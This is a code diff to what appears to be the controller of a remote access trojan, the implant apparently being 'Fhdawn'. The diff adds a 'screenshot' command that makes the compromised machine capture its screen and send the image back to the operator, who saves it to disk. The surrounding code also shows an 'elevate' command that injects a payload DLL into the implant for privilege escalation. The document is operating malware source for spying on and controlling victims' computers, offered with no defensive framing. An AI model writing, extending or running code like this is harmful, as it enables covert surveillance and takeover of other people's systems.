@@ -655,6 +655,9 @@ Open Ports
                 elif(main == "help"):
                     print(help)
 
+                elif(main == "screenshot"):
+                    self.SendData("screenshot")
+                    self.WaitForReply()
                 elif(main == "elevate"):
                     print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
                     DLLTransfer("payloads/elevate.dll", "Fhdawn.exe") # Inject elevate.dll in Fhdawn.exe
@@ -774,6 +777,35 @@ Open Ports
                     except Exception as e:
                         print("[X] Error : " + str(e))
                         print("[i] File Download Information : " + client_data)
+                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
+                        print("[i] Please report this bug to developer with the information above.")
+                        pass
+                
+                # Get screenshot, Convert to jpeg and save
+                elif(client_data.startswith("SCREENSHOT")):
+                    try:
+                        fileinfo = client_data.split(":") #FILE:filename.txt:555
+                        #print(fileinfo)
+                        filename = hostList[indexof].split("/")[1].replace(" ","") + "-" + fileinfo[1]
+                        filesize = int(fileinfo[2])
+                        SaveFile = "downloads/"+ filename
+                        FinalF = uniquify(SaveFile)
+
+                        with open(FinalF, "wb") as incoming_file:
+                            data = self.client_socket.recv(4096)
+                           
+                            #print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=filename, fd=FinalF))
+                            while(len(data) != filesize):
+                                data += self.client_socket.recv(filesize - len(data))  
+                                #print("data = " + str(len(data)) + " filesize = " + str(filesize))
+                                if not data: break
+                            incoming_file.write(data)
+
+                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Screenshot saved to '{fl}'".format(fl=FinalF))
+
+                    except Exception as e:
+                        print("[X] Error : " + str(e))
+                        print("[i] Screenshot Download Information : " + client_data)
                         # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                         print("[i] Please report this bug to developer with the information above.")
                         pass
